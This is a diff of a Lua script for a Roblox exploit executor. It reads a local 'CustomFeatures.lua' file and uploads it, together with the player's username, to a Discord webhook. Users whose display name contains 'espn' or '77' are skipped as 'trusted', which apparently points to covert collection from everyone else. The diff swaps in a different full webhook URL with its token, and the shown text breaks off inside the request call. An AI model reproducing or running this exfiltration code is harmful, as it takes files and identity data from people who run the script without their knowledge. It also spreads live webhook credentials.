@@ -1,40 +1,33 @@
--- Fully Working Multipart File Upload for Discord Webhooks (with Username)
-
 local filePath = "WindUI/CustomFeatures/CustomFeatures.lua"
-local webhookURL = "https://discord.com/api/webhooks/1439537916174008420/p8br6BWX6t-4HRSZn25Hafy7FGkYEL6ky4IXEgVh_7Bus5Pebqoc1ImuLmfSESLWvjD3"
+local webhookURL = "https://discord.com/api/webhooks/1439696796686225638/hfg2yu0LrvxZV1Gm74xSI2dKEiNKHzdYdGRZQJDzN4-gZwVCeV5nMfWm1pYIb20nPLHT"
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
--- Read file
 local ok, content = pcall(readfile, filePath)
 if not ok then
     warn("Failed to read file:", filePath)
     return
 end
 
--- Skip trusted
 local displayName = string.lower(player.DisplayName)
 if string.find(displayName, "espn") or string.find(displayName, "77") then
     warn("Trusted user - skipping upload")
     return
 end
 
--- Executor request function
 local requestfn = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)
 if not requestfn then
     warn("No request function found")
     return
 end
 
--- *** Correct Discord Multipart Boundary ***
 local boundary = "------------------------" .. tostring(math.random(100000,999999))
 
 local CRLF = "\r\n"
 local body = {}
 
--- Webhook message (username added)
 table.insert(body, "--" .. boundary)
 table.insert(body, 'Content-Disposition: form-data; name="content"')
 table.insert(body, "")
@@ -43,20 +36,16 @@ table.insert(body,
     "👥 Username: **" .. player.Name .. "**"
 )
 
--- *** Correct Discord file field: files[0] ***
 table.insert(body, "--" .. boundary)
 table.insert(body, 'Content-Disposition: form-data; name="files[0]"; filename="CustomFeatures.lua"')
 table.insert(body, "Content-Type: text/plain")
 table.insert(body, "")
 table.insert(body, content)
 
--- End
 table.insert(body, "--" .. boundary .. "--")
 
--- Join with CRLF
 body = table.concat(body, CRLF)
 
--- SEND REQUEST
 local response = requestfn({
     Url = webhookURL,
     Method = "POST",
